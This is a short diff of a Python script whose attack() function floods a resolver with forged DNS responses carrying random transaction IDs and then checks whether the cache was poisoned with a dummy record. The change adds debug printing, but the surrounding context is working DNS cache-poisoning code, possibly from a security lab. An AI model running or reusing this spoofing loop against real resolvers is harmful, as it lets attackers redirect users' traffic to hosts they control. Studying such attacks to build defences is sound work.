@@ -81,7 +81,7 @@ def attack():
         sock.sendto(bytes(dns_request), (my_ip, dns_port))
         for i in range(60):
             fake_response[DNS].id = getRandomTXID()
-            print "TXID = %s" % str(fake_response[DNS].id)
+            # print "TXID = %s" % str(fake_response[DNS].id)
             sock.sendto(bytes(fake_response), (my_ip, query_port))
 
         # check to see if it worked
@@ -92,7 +92,8 @@ def attack():
                 print "Successfully poisonned our target with a dummy record !!"
                 break
             else:
-                print "Poisonning failed ", res[DNS].ns[0].rdata 
+                print "Poisonning on %s failed, ns is %s" % (url, res[DNS].ns[0].rdata)
+                print res.show()
         except:
             print "Poisonning failed"
     
